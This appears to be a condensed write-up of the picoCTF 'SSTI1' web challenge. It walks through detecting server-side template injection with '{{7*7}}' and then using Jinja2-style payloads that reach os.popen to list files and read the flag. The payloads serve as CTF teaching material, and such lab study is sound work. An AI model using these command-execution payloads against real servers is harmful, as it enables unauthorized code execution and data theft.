---
id: f1b283adaaf7
title: "picoCTF Web Exploitation - SSTI1"
source_url: https://medium.com/@sumansutradhar5744/picoctf-web-exploitation-ssti1-b74afe4f0830
author: "Suman sutradhar"
publication_date: 2026-08-16
category: rce
category_label: "RCE / Code Execution"
content_type: vuln_writeup
steps_source: extracted
tags:
  - "cybersecurity"
  - "ssti1"
  - "picoctf"
  - "bug-bounty"
tools:
  []
quick_test: "Test user input in template engines by injecting simple expressions to confirm if they are evaluated, then escalate to command execution payloads."
---

## Use case

The application processes user input through a server-side template engine without proper sanitization, allowing an attacker to execute arbitrary commands on the server. This vulnerability can lead to significant security risks, including unauthorized access to sensitive data and system control.

## Steps to test

1. Identify the input field in the web application.
2. Input a simple arithmetic expression like '{{7*7}}' to check if the input is evaluated.
3. If the output is '49', confirm that SSTI is present.
4. Attempt to execute a command using the payload '{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}'.
5. If successful, modify the command to read the flag file using '{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}'.
6. Retrieve the output to obtain the flag.

## Commands

```text
{{7*7}}
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
__import__('os')
cat flag
{{ __import__('os').popen('ls').read() }}
request.application.__globals__.__builtins__.__import__
```

## Source

- Author: Suman sutradhar
- Writeup: https://medium.com/@sumansutradhar5744/picoctf-web-exploitation-ssti1-b74afe4f0830

_For authorized testing only. Credit the original author._
